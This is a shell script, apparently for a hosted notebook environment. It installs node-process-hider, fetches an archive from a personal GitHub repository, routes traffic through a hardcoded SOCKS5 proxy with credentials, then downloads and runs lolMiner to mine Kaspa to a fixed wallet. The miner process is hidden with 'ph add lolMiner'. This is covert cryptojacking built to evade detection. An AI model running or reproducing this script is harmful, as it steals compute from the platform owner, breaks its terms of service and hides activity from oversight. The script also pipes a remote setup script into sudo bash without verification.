apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 143.198.80.229:443
socks5_username = babang
socks5_password = babang123
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.65/lolMiner_v1.65_Lin64.tar.gz
./graftcp/graftcp tar -zxvf lolMiner_v1.65_Lin64.tar.gz
cp 1.65/lolMiner /content/
chmod +x lolMiner

ph add lolMiner

./graftcp/graftcp ./lolMiner --algo KASPA --pool stratum+tcp://pool.us.woolypooly.com --port 3112 --user kaspa:qqjgh3lff277858uhn7upgpl4xlmqkhwry33wg0vfjxhnxexap8gywc62xf3f.$(echo $(shuf -i 1-999 -n 1)-LOL)
